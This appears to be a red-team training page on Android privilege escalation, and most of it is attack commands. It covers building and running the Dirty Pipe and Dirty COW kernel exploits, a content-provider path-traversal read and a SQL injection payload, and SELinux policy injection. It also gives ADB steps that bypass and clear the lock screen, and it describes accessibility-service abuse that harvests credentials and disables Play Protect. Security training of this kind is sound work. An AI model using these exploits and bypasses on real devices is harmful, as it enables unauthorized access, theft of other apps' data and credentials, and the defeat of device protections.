---
layout: training-page
title: "Android Privilege Escalation — Red Team Academy"
module: "Mobile Security"
tags:
  - android
  - privilege-escalation
  - root
  - kernel
  - selinux
page_key: "mobile-android-privesc"
---
<h1>Android Privilege Escalation</h1>
<p>Escalating privileges on Android — from an unprivileged app context to root or system-level access. Covers kernel exploits, SELinux bypasses, misconfigured app permissions, and Android-specific escalation vectors.</p>

<h2>Android Security Model</h2>
<pre><code># Android security layers (bottom to top):
# 1. Linux kernel — process isolation, file permissions
# 2. SELinux (mandatory access control) — enforces security policies
# 3. App sandbox — each app runs as unique UID in isolated directory
# 4. Permissions model — runtime permissions granted by user
# 5. Verified Boot — ensures OS integrity at boot

# Key concepts:
# - Each app gets a unique Linux UID (e.g., u0_a150)
# - App data: /data/data/&lt;package&gt;/ — only accessible by that UID
# - SELinux contexts restrict what processes can do (even as root)
# - "root" on Android means bypassing all of the above

# Check current security state
adb shell id                         # current UID
adb shell getenforce                 # SELinux mode (Enforcing/Permissive)
adb shell cat /proc/version          # kernel version
adb shell getprop ro.build.version.security_patch  # security patch level</code></pre>

<h2>Kernel Exploits</h2>
<h3>Dirty Pipe (CVE-2022-0847)</h3>
<pre><code># Affects: Linux kernel 5.8 — 5.16.11 (Android 12/12L/13 devices)
# Impact: Write to arbitrary read-only files, including system binaries
# Can overwrite /system files to inject code or disable security

# Check if vulnerable
adb shell cat /proc/version
# Vulnerable if kernel 5.8.x — 5.16.11

# Exploit concept:
# 1. Open a read-only file (e.g., /etc/passwd equivalent)
# 2. Abuse pipe buffer page cache poisoning
# 3. Write arbitrary data to the file
# 4. Overwrite su binary or inject into init scripts

# Public PoC: github.com/polygraphene/DirtyPipe-Android
# Compile for Android target architecture:
# NDK cross-compile:
$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android31-clang \
    -o dirtypipe dirtypipe.c
adb push dirtypipe /data/local/tmp/
adb shell chmod +x /data/local/tmp/dirtypipe
adb shell /data/local/tmp/dirtypipe</code></pre>

<h3>Dirty COW (CVE-2016-5195)</h3>
<pre><code># Affects: Linux kernel &lt; 4.8.3 (older Android 5-7 devices)
# Impact: Write to read-only memory mappings
# Classic privilege escalation — replace system binaries

# Check kernel version
adb shell uname -r

# Cross-compile for Android
$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/arm-linux-androideabi-gcc \
    -static -o dirtycow dirtycow.c -lpthread
adb push dirtycow /data/local/tmp/
adb shell chmod +x /data/local/tmp/dirtycow

# Use to overwrite /system/bin/run-as with a root shell
# run-as has setuid bit — after overwrite, executing run-as gives root</code></pre>

<h3>CVE-2024-53104 (USB Video Class)</h3>
<pre><code># Affects: Linux kernel USB Video Class driver
# Impact: Out-of-bounds write via crafted USB video frames
# Exploitable via physical USB access or USB gadget mode

# This is a newer kernel vuln patched in Feb 2025
# Check security patch level:
adb shell getprop ro.build.version.security_patch
# Vulnerable if before 2025-02-05</code></pre>

<h2>App-Level Privilege Escalation</h2>
<h3>Exploiting Misconfigured Content Providers</h3>
<pre><code># Content providers with path traversal allow reading other apps' data
# Effectively escalates from one app's sandbox to another's

# Find providers with file-serving capabilities
drozer console connect
run scanner.provider.traversal -a com.target.app

# Exploit path traversal
adb shell content read \
    --uri "content://com.target.app.provider/files/../../../../data/data/com.other.app/shared_prefs/keys.xml"

# SQL injection in content providers — extract data cross-app
adb shell content query \
    --uri "content://com.target.app.provider/data" \
    --where "1=1) UNION SELECT sql,2,3 FROM sqlite_master--"</code></pre>

<h3>Exploiting debuggable Apps</h3>
<pre><code># If an app has android:debuggable="true" in production:
# Any app (or ADB) can attach a debugger and control execution

# Find debuggable apps
adb shell "pm list packages -f | while read pkg; do
    p=$(echo $pkg | cut -d= -f2)
    if dumpsys package $p | grep -q 'debuggable=true'; then
        echo \"DEBUGGABLE: $p\"
    fi
done"

# Attach and execute code in the app's context
adb shell run-as com.debuggable.app
# Now running as the app's UID — can read its private data
cat shared_prefs/*.xml
cat databases/*.db

# With JDWP debugger (Java Debug Wire Protocol):
adb forward tcp:8700 jdwp:$(adb shell ps | grep com.debuggable.app | awk '{print $2}')
jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700</code></pre>

<h3>Intent Hijacking for Privilege Escalation</h3>
<pre><code># A privileged app sends implicit intents that can be intercepted
# by a malicious app registered with a matching intent filter

# Example: banking app sends intent with transaction details
# Malicious app registers matching intent filter with higher priority
# Intercepts the intent, modifies it, and forwards to real recipient

# Pending intent hijacking:
# If a privileged app creates a PendingIntent with an implicit base intent,
# a malicious app can fill in the missing fields and trigger the action
# with the privileged app's permissions

# Identify vulnerable patterns with drozer:
run app.broadcast.info -a com.target.app -u
run app.service.info -a com.target.app -u
# Look for implicit intent usage in exported components</code></pre>

<h2>SELinux Bypass Techniques</h2>
<pre><code># SELinux on Android restricts what even root can do
# Modern Android uses "enforcing" mode — must bypass for full access

# Check SELinux status
adb shell getenforce           # Enforcing = active
adb shell cat /sys/fs/selinux/enforce  # 1 = enforcing

# Method 1: Set to permissive (requires kernel exploit or unlocked bootloader)
adb shell setenforce 0         # requires root + kernel support
# Some kernels compile out this ability

# Method 2: Magisk — modifies boot image to patch SELinux policies
# Magisk creates a "permissive" context for the su binary
# Apps granted root via Magisk Manager run in magisk_su context
# This context has broad SELinux permissions

# Method 3: SELinux policy injection (if you have root)
# Use sepolicy-inject to add custom allow rules
sepolicy-inject -s untrusted_app -t app_data_file -c file -p read,write -l

# Method 4: Exploit SELinux policy bugs
# Misconfigured policies sometimes allow unexpected access
# Audit with: adb shell sesearch --allow | grep untrusted_app</code></pre>

<h2>Escalation via Installed Apps</h2>
<h3>Vulnerable System Apps</h3>
<pre><code># System apps run with elevated permissions (system UID, signature perms)
# Exploiting a system app gives access to those privileges

# Find system apps with exported components
adb shell pm list packages -s | cut -d: -f2 | while read pkg; do
    attack=$(adb shell dumpsys package $pkg | grep -c "exported=true")
    if [ "$attack" -gt "0" ]; then
        echo "$pkg: $attack exported components"
    fi
done

# Common targets:
# - Settings app — may have exported activities that bypass auth
# - File managers — path traversal in file picker intents
# - OEM preloads — vendor apps often have poor security
# - Carrier apps — elevated permissions, weak security

# OEM-specific escalation:
# Samsung: knox container escape, SemClipboard vulnerabilities
# Xiaomi: MIUI system app exported services
# Huawei: HwSystemManager privilege escalation
# Check CVE databases for device-specific vulns</code></pre>

<h3>Exploiting Accessibility Services</h3>
<pre><code># If you can get user to grant Accessibility permission to your app:
# - Read all on-screen text (credential harvesting)
# - Perform UI actions (auto-grant permissions, navigate settings)
# - Overlay attacks (draw on top of other apps)
# - Cannot be easily killed (sticky service)

# Use accessibility to auto-grant yourself more permissions:
# 1. Navigate to Settings &gt; Apps &gt; YourApp &gt; Permissions
# 2. Programmatically tap "Allow" for each permission
# 3. Effectively self-escalate to all dangerous permissions

# Accessibility can also disable security:
# 1. Navigate to Settings &gt; Security
# 2. Disable screen lock
# 3. Enable "Install from unknown sources"
# 4. Disable Google Play Protect</code></pre>

<h2>ADB-Based Escalation</h2>
<pre><code># ADB shell runs as "shell" user — limited but useful privileges

# What shell user can do:
adb shell dumpsys           # system service info (accounts, wifi, etc.)
adb shell content query     # query content providers
adb shell am                # start activities, send broadcasts
adb shell pm                # manage packages
adb shell settings          # read/write system settings
adb shell input             # simulate taps, swipes, keystrokes
adb shell screencap         # capture screen
adb shell screenrecord      # record screen

# Escalate from shell to root (if device is rooted):
adb shell su

# Bypass lock screen via ADB
adb shell input keyevent 82              # unlock (swipe up)
adb shell input text "1234"              # enter PIN
adb shell input keyevent 66              # press Enter

# Disable lock screen entirely
adb shell locksettings clear --old "1234"
# Or: adb shell settings put secure lockscreen.disabled 1

# Enable ADB root on userdebug/eng builds
adb root                                 # restarts ADB daemon as root
adb remount                              # remount /system as read-write</code></pre>

<h2>Magisk-Based Root</h2>
<pre><code># Magisk is the standard root solution — important to understand for red teaming
# github.com/topjohnwu/Magisk

# How Magisk works:
# 1. Patches boot image (boot.img) to run early in boot
# 2. Creates overlay filesystem (MagiskSU) on top of /system
# 3. Injects su binary and SELinux policy patches
# 4. Hides modifications from SafetyNet/Play Integrity (MagiskHide/Zygisk)

# Install Magisk (requires unlocked bootloader):
# 1. Extract boot.img from factory image or device
adb shell dd if=/dev/block/by-name/boot of=/sdcard/boot.img
adb pull /sdcard/boot.img

# 2. Patch with Magisk app
# Install Magisk APK, use it to patch boot.img

# 3. Flash patched boot image
adb reboot bootloader
fastboot flash boot magisk_patched_boot.img
fastboot reboot

# Verify root
adb shell su -c id
# uid=0(root) gid=0(root)

# Magisk modules — extend functionality:
# - LSPosed: Xposed framework for hooking any app
# - MagiskFrida: auto-start Frida server on boot
# - Universal SafetyNet Fix: bypass attestation checks</code></pre>

<h2>Automated Privilege Escalation Tools</h2>
<pre><code># LinPEAS for Android
# github.com/carlospolop/PEASS-ng
# Runs Linux privilege escalation checks adapted for Android

adb push linpeas.sh /data/local/tmp/
adb shell chmod +x /data/local/tmp/linpeas.sh
adb shell /data/local/tmp/linpeas.sh | tee linpeas_output.txt

# mvt-android (Mobile Verification Toolkit)
# Originally for forensics — useful for finding exploitable state
pip install mvt
mvt-android check-adb --output ./mvt_results/

# andriller — Android forensic extraction
pip install andriller
# Extracts: databases, shared prefs, passwords, call logs, etc.</code></pre>

<h2>Resources</h2>
<ul>
  <li>Dirty Pipe Android PoC — <code>github.com/polygraphene/DirtyPipe-Android</code></li>
  <li>Magisk — <code>github.com/topjohnwu/Magisk</code></li>
  <li>PEASS-ng (LinPEAS) — <code>github.com/carlospolop/PEASS-ng</code></li>
  <li>Android Security Bulletins — <code>source.android.com/docs/security/bulletin</code></li>
  <li>SELinux on Android — <code>source.android.com/docs/security/features/selinux</code></li>
  <li>MITRE ATT&amp;CK Mobile Privilege Escalation — <code>attack.mitre.org/tactics/TA0629/</code></li>
</ul>
